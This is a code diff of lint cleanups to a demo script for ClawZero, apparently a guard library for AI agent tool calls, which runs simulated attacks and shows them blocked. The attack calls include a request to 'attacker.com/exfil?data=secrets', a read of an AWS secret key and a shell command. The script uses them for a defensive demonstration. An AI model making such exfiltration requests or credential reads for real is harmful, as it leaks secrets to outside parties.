@@ -21,7 +21,7 @@ if str(SRC_ROOT) not in sys.path:
     sys.path.insert(0, str(SRC_ROOT))
 
 
-from clawzero import protect, ExecutionBlocked, set_witness_output_dir
+from clawzero import protect, ExecutionBlocked, set_witness_output_dir  # noqa: E402
 
 # Enable witness JSON output
 WITNESS_DIR = Path(__file__).parent / "witness_output"
@@ -60,7 +60,7 @@ def print_result(protected: bool, blocked: bool, reason: str = ""):
     else:
         symbol = "✗" if blocked else "✓"
         status = "BLOCKED" if blocked else "EXECUTED"
-        print(f"[ Baseline agent - no protection ]")
+        print("[ Baseline agent - no protection ]")
         print(f"→ Result: {status} {symbol}")
 
 
@@ -170,15 +170,15 @@ def attack_2_shell_escalation():
     print_attack("Shell escalation")
 
     # Baseline (no protection)
-    print(f"[ Baseline ]  → EXECUTED ✗")
+    print("[ Baseline ]  → EXECUTED ✗")
 
     # With ClawZero
     try:
         execute_shell_protected("whoami")
-        print(f"[ ClawZero ] → EXECUTED ✗")
+        print("[ ClawZero ] → EXECUTED ✗")
         return False
     except ExecutionBlocked:
-        print(f"[ ClawZero ] → BLOCKED ✓")
+        print("[ ClawZero ] → BLOCKED ✓")
         return True
 
 
@@ -187,15 +187,15 @@ def attack_3_credential_access():
     print_attack("Credential access")
 
     # Baseline (no protection)
-    print(f"[ Baseline ]  → EXECUTED ✗")
+    print("[ Baseline ]  → EXECUTED ✗")
 
     # With ClawZero
     try:
         access_credentials_protected("AWS_SECRET_KEY")
-        print(f"[ ClawZero ] → EXECUTED ✗")
+        print("[ ClawZero ] → EXECUTED ✗")
         return False
     except ExecutionBlocked:
-        print(f"[ ClawZero ] → BLOCKED ✓")
+        print("[ ClawZero ] → BLOCKED ✓")
         return True
 
 
@@ -204,16 +204,16 @@ def attack_4_api_exfiltration():
     print_attack("API data exfiltration → attacker.com")
 
     # Baseline (no protection)
-    print(f"[ Baseline ]  → EXECUTED ✗")
+    print("[ Baseline ]  → EXECUTED ✗")
 
     # With ClawZero (prod_locked only allows localhost)
     try:
         make_http_request_protected("https://attacker.com/exfil?data=secrets")
-        print(f"[ ClawZero ] → EXECUTED ✗")
+        print("[ ClawZero ] → EXECUTED ✗")
         return False
     except ExecutionBlocked as e:
         reason = e.decision.human_reason
-        print(f"[ ClawZero ] → BLOCKED ✓")
+        print("[ ClawZero ] → BLOCKED ✓")
         print(f"  Reason : {reason}")
         return True
 
@@ -223,17 +223,17 @@ def benign_1_allowed_http_request():
     print_attack("Benign HTTP request (dev_balanced policy)")
 
     # Baseline (no protection)
-    print(f"[ Baseline ]  → EXECUTED ✓")
+    print("[ Baseline ]  → EXECUTED ✓")
 
     # With ClawZero (dev_balanced allows http.request)
     try:
-        result = make_http_request_benign("https://api.example.com/data")
-        print(f"[ ClawZero ] → ALLOWED ✓")
-        print(f"  Policy  : dev_balanced permits http.request")
+        make_http_request_benign("https://api.example.com/data")
+        print("[ ClawZero ] → ALLOWED ✓")
+        print("  Policy  : dev_balanced permits http.request")
         return True
     except ExecutionBlocked as e:
         # Should not happen with dev_balanced
-        print(f"[ ClawZero ] → BLOCKED ✗ (unexpected)")
+        print("[ ClawZero ] → BLOCKED ✗ (unexpected)")
         print(f"  Reason : {e.decision.human_reason}")
         return False
 
